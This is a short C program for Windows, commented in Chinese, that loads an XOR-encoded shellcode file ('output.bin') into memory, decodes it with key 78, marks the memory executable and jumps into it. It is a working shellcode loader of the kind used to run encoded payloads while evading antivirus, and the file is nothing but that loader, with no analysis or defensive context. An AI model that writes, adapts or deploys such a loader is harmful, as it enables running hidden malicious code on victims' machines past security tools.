#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <assert.h>

int main()
{
    FILE *infile;
    infile = fopen("output.bin", "rb");
    assert(infile);
    size_t size=0;
    // 获取output.bin文件大小
    fseek(infile, 0, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0, SEEK_SET);
    // 申请内存
    LPVOID memory = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    assert(memory);
    // 读取文件内容到内存
    size_t read_size = fread(memory, 1, size, infile);
    assert(read_size == size);
    fclose(infile);
    // 解码
    for (size_t i = 0; i < size; i++)
    {
        ((char *)memory)[i] ^= 78;
    }
    printf("Decoded shellcode size: %zu bytes\n", size);
    // 修改内存保护属性
    DWORD oldProtect;
    VirtualProtect(memory, size, PAGE_EXECUTE_READ, &oldProtect);
    // 执行shellcode
    ((void (*)())memory)();
    // 释放内存
    VirtualFree(memory, 0, MEM_RELEASE);

    return 0;
}